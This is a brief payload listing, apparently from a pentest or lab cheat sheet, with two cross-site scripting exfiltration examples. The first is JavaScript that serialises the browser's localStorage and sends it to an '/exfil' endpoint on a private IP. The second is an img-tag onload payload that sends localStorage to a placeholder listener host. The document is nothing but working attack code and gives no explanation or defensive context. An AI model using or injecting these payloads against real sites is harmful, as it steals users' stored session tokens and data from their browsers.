EX1:
let data = JSON.stringify(localStorage)
let encodedData = encodeURIComponent(data)
fetch("http://192.168.49.51/exfil?data=" + encodedData)

EX2:
<img src=<existing_image> onload=this.src="http://<LISTENER>/?a="+encodeURIComponent(JSON.stringify(window.localStorage))>
